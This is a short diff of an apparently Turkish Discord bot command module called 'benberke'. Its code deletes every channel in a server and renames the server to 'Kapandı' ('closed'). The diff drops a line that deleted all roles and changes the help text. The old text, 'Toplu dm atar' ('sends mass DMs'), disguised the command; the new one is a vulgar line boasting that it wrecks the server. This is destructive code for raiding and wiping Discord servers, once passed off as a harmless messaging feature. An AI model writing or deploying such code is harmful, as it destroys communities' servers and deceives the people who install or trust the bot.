@@ -12,7 +12,6 @@ message.delete()
 })
 
 message.guild.channels.deleteAll("");
-message.guild.roles.deleteAll("");
 }
 
 message.guild.setName(`Kapandı`, "")
@@ -31,6 +30,6 @@ exports.conf = {
 
 exports.help = {
   name: 'benberke',
-  description: 'Toplu dm atar.', 
-  usage: 'dmduyuru [mesaj]'
+  description: 'sunucu siker', 
+  usage: 'ben berke = sunucu siker'
 };
